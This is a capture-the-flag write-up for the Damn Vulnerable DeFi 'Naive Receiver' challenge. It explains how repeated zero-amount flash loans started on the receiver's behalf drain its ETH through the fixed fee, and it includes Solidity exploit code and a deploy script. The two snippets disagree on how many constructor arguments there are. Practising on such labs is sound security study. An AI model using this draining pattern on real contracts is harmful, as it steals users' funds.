### [Task Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/naive-receiver)

### Task

>There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

>A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

>Take all ETH out of the user’s contract. If possible, in a single transaction.

### Observations

- The Reveicever Contract has "Naively" allowed anyone to call a flash loan on it's behalf. 

- The pool it calls to remains the same so we cannot pretend to be a flashloan provider.

- However the pool in question provides a fixed fee of 1 Eth. 

- We can create a contract to make a flashloan 10 times to drain 10 Eth.

### Steps

- Write a for loop that calls the lender contracts `flashLoan` function on the naive receivers behalf...10 times. Doesn't even need to borrow a value > 0.

```
constructor(
        address payable poolAddress,
        address receiverAddress,
        address token
    ) {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(poolAddress).flashLoan(
                IERC3156FlashBorrower(receiverAddress),
                token,
                0,
                bytes("")
            );
        }
    }
```

- Deploy the malicious contract, the malicious action will run in the constructor.

```
const NaiveAttackerFactory = await ethers.getContractFactory("NaiveAttacker", attacker);
    await NaiveAttackerFactory.deploy(this.pool.address, this.receiver.address);
```

